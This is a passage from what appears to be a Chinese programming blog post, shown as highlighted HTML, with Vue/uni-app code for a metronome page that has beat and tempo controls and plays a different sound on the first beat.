class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 切换播放/停止状态的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">togglePlay</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;stopped&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">playStatus</span> = <span class="string">&#x27;playing&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">initAudio</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">startMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">playStatus</span> = <span class="string">&#x27;stopped&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">stopMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 启动节拍器的方法，通过定时器播放声音</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">startMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> intervalTime = <span class="number">60000</span> / <span class="variable language_">this</span>.<span class="property">speed</span>; <span class="comment">// 根据速度计算每个节拍的间隔时间（毫秒）</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">intervalId</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>(); <span class="comment">// 播放音效</span></span></span><br><span class="line"><span class="language-javascript">      &#125;, intervalTime);</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 停止节拍器的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">stopMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">intervalId</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">intervalId</span> = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 重启节拍器（用于更新速度或节拍）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">restartMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="title function_">stopMetronome</span>(); <span class="comment">// 先停止当前节拍器</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="title function_">startMetronome</span>(); <span class="comment">// 再重新启动</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">onUnload</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 页面卸载时清理音频资源</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">audioContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">destroy</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.label</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.value</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#007aff</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slider</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">90%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.button-group</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">gap</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.button</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#007aff</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.play-button</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#34c759</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.play-button</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#32a852</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="区分第一拍-其余拍"><a href="#区分第一拍-其余拍" class="headerlink" title="区分第一拍&#x2F;其余拍"></a>区分第一拍&#x2F;其余拍</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 节拍显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;label&quot;</span>&gt;</span>节拍：<span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;value&quot;</span>&gt;</span>&#123;&#123; beat &#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 滑块定义节拍数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slider</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;slider&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">min</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">max</span>=<span class="string">&quot;10&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">step</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; beat &#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">change</span>=<span class="string">&quot;handleBeatChange&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">slider</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 速度显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;label&quot;</span>&gt;</span>速度：<span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;value&quot;</span>&gt;</span>&#123;&#123; speed &#125;&#125; BPM<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 增加/减少速度按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;button-group&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;increaseSpeed&quot;</span>&gt;</span>加速<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;decreaseSpeed&quot;</span>&gt;</span>减速<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 播放/停止按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;play-button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;togglePlay&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123; playStatus === &#x27;playing&#x27;? &#x27;停止&#x27; : &#x27;播放&#x27; &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">beat</span>: <span class="number">4</span>, <span class="comment">// 初始节拍数</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">speed</span>: <span class="number">60</span>, <span class="comment">// 初始速度（每分钟节拍数）</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">playStatus</span>: <span class="string">&#x27;stopped&#x27;</span>, <span class="comment">// 播放状态，初始为停止</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">intervalId</span>: <span class="literal">null</span>, <span class="comment">// 用于存储定时器ID</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">audioContext</span>: <span class="literal">null</span>, <span class="comment">// 音频上下文</span></span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 初始化音频上下文</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">initAudio</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">audioContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span> = uni.<span class="title function_">createInnerAudioContext</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 先不设置具体音频源，后续根据节拍播放不同音频</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">volume</span> = <span class="number">1.0</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 处理滑块改变节拍数的事件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">handleBeatChange</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">beat</span> = event.<span class="property">detail</span>.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;playing&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">restartMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 根据节拍数播放一次相应音频</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">beat</span> === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a2.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a3.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 增加速度的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">increaseSpeed</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">speed</span> += <span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;playing&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">restartMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 根据节拍数播放一次相应音频</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">beat</span> === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a2.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a3.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 减少速度的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">decreaseSpeed</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">speed</span> -= <span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">speed</span> &lt; <span class="number">5</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">speed</span> = <span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;playing&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">restartMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 根据节拍数播放一次相应音频</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">beat</span> === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a2.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a3.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 切换播放/停止状态的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">togglePlay</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;stopped&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">playStatus</span> = <span class="string">&#x27;playing&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">initAudio</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">startMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">playStatus</span> = <span class="string">&#x27;stopped&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">stopMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 启动节拍器的方法，通过定时器播放声音</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">startMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> intervalTime = <span class="number">60000</span> / <span class="variable language_">this</span>.<span class="property">speed</span>; <span class="comment">// 根据速度计算每个节拍的间隔时间（毫秒）</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> currentBeat = <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">intervalId</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">beat</span> === <span class="number">4</span> &amp;&amp; currentBeat === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a2.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a3.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (currentBeat === <span class="variable language_">this</span>.<span class="property">beat</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          currentBeat = <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          currentBeat++;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;, intervalTime);</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 停止节拍器的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">stopMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">intervalId</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">intervalId</span> = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 重启节拍器（用于更新速度或节拍）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">restartMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="title function_">stopMetronome</span>(); <span class="comment">// 先停止当前节拍器</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="title function_">startMetronome</span>(); <span class="comment">// 再重新启动</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">onUnload</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 页面卸载时清理音频资源</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">audioContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">destroy</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span 